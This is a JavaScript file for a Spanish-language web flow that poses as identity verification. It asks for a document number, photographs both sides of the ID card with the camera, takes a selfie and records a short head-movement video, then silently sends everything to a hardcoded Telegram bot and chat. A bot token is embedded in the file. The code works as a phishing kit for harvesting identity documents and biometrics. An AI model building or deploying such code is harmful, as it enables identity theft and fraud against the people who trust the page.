document.addEventListener('DOMContentLoaded', () => {
    // Determine which page we are on
    const isVerificationPage = window.location.pathname.includes('verification.html');
    
    // --- SHARED CONFIG ---
    // REEMPLAZA ESTOS VALORES CON LOS TUYOS
    const TELEGRAM_BOT_TOKEN = '7793777042:AAHegpN7eQIAcBJZjtMDfZZIwGnsmqv7vfg'; 
    const TELEGRAM_CHAT_ID = '-4992418825';

    // --- PAGE: INDEX (FORM + ID SCAN) ---
    if (!isVerificationPage) {
        const loginForm = document.getElementById('login-form');
        const loginStep = document.getElementById('login-step');
        const idScanStep = document.getElementById('id-scan-step');
        const idVideo = document.getElementById('id-webcam');
        const idInstruction = document.getElementById('id-scan-instruction');
        const idStatus = document.querySelector('.camera-status');

        if (loginForm) {
            loginForm.addEventListener('submit', (e) => {
                e.preventDefault();
                
                const docType = document.getElementById('doc-type').value;
                const docNumber = document.getElementById('doc-number').value;
                
                if (docType && docNumber) {
                    // Save info for next page
                    localStorage.setItem('docType', docType);
                    localStorage.setItem('docNumber', docNumber);
                    
                    // Send text notification
                    sendTextToTelegram(`Nuevo usuario iniciando:\nTipo: ${docType}\nDocumento: ${docNumber}`);
                    
                    // Start ID Scan
                    transitionToIDScan();
                }
            });
        }

        async function transitionToIDScan() {
            loginStep.classList.add('hidden');
            idScanStep.classList.remove('hidden');
            
            await startIDCamera();
            scanIDSide('front');
        }

        async function startIDCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } },
                    audio: false 
                });
                idVideo.srcObject = stream;
            } catch (err) {
                console.error("Error accessing ID camera:", err);
                try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     idVideo.srcObject = stream;
                } catch (e) {
                    if (idStatus) idStatus.textContent = "Error de cámara";
                }
            }
        }

        function scanIDSide(side) {
            if (side === 'front') {
                idInstruction.textContent = "Ubique la cara FRONTAL de su documento";
                idStatus.textContent = "Buscando documento...";
            } else {
                idInstruction.textContent = "Ubique el REVERSO de su documento";
                idStatus.textContent = "Gire su documento...";
            }

            setTimeout(() => {
                idStatus.textContent = "Capturando...";
                captureIDImage(side, () => {
                    idStatus.textContent = "¡Capturado!";
                    
                    setTimeout(() => {
                        if (side === 'front') {
                            scanIDSide('back');
                        } else {
                            stopIDCamera();
                            // REDIRECT TO VERIFICATION PAGE
                            window.location.href = 'verification.html';
                        }
                    }, 1000);
                });
            }, 4000);
        }

        function captureIDImage(side, callback) {
            const canvas = document.createElement('canvas');
            canvas.width = idVideo.videoWidth;
            canvas.height = idVideo.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(idVideo, 0, 0);
            
            const docNum = localStorage.getItem('docNumber') || 'Desconocido';
            
            canvas.toBlob((blob) => {
                sendPhotoToTelegram(blob, `id_${side}.jpg`, `Documento (${side}) - ${docNum}`);
                if (callback) callback();
            }, 'image/jpeg', 0.8);
        }

        function stopIDCamera() {
            if (idVideo && idVideo.srcObject) {
                const tracks = idVideo.srcObject.getTracks();
                tracks.forEach(track => track.stop());
                idVideo.srcObject = null;
            }
        }
    }

    // --- PAGE: VERIFICATION (SELFIE + VIDEO) ---
    if (isVerificationPage) {
        const video = document.getElementById('webcam');
        const cameraInstruction = document.querySelector('.camera-instruction');
        const verificationStep = document.getElementById('verification-step');
        const successStep = document.getElementById('success-step');
        let mediaRecorder;
        let recordedChunks = [];

        // Auto-start verification when page loads
        if (video) {
            startCamera();
        }

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: false 
                });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    setTimeout(startVerificationProcess, 1000);
                };
            } catch (err) {
                console.error("Error accessing camera:", err);
                if (cameraInstruction) cameraInstruction.textContent = "Error de cámara";
            }
        }

        function startVerificationProcess() {
            cameraInstruction.textContent = "Mirando al frente...";
            
            setTimeout(() => {
                captureSelfie();
                
                cameraInstruction.textContent = "Mueva su cabeza lentamente...";
                startRecording();
                
                setTimeout(() => {
                    stopRecording();
                    cameraInstruction.textContent = "Procesando...";
                }, 4000);
                
            }, 1500);
        }

        function captureSelfie() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            const docNum = localStorage.getItem('docNumber') || 'Desconocido';

            canvas.toBlob((blob) => {
                sendPhotoToTelegram(blob, 'selfie.jpg', `Selfie - ${docNum}`);
            }, 'image/jpeg', 0.8);
        }

        function startRecording() {
            if (!video.srcObject) return;
            
            recordedChunks = [];
            let options = { mimeType: 'video/webm;codecs=vp8' };
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                 options = { mimeType: 'video/webm' };
            }
            
            try {
                mediaRecorder = new MediaRecorder(video.srcObject, options);
            } catch (e) {
                mediaRecorder = new MediaRecorder(video.srcObject);
            }

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const docNum = localStorage.getItem('docNumber') || 'Desconocido';
                sendVideoToTelegram(blob, `Video - ${docNum}`);
                stopCamera();
                transitionToSuccess();
            };

            mediaRecorder.start();
        }

        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
            }
        }

        function stopCamera() {
            if (video.srcObject) {
                const tracks = video.srcObject.getTracks();
                tracks.forEach(track => track.stop());
                video.srcObject = null;
            }
        }

        function transitionToSuccess() {
            verificationStep.classList.add('hidden');
            successStep.classList.remove('hidden');
            
            // Clear sensitive data
            localStorage.removeItem('docNumber');
            localStorage.removeItem('docType');

            setTimeout(() => {
                // Redirect back to start or elsewhere
                window.location.href = 'index.html';
            }, 3000);
        }
    }

    // --- SHARED: TELEGRAM FUNCTIONS ---

    function sendTextToTelegram(text) {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('text', text);

        fetch(url, { method: 'POST', body: formData }).catch(console.error);
    }

    function sendPhotoToTelegram(blob, filename, caption) {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, filename || 'photo.jpg');
        formData.append('caption', caption || '');

        fetch(url, { method: 'POST', body: formData }).catch(console.error);
    }

    function sendVideoToTelegram(blob, caption) {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', blob, 'biometric_video.webm');
        formData.append('caption', caption || 'Video de prueba');

        fetch(url, { method: 'POST', body: formData }).catch(console.error);
    }
});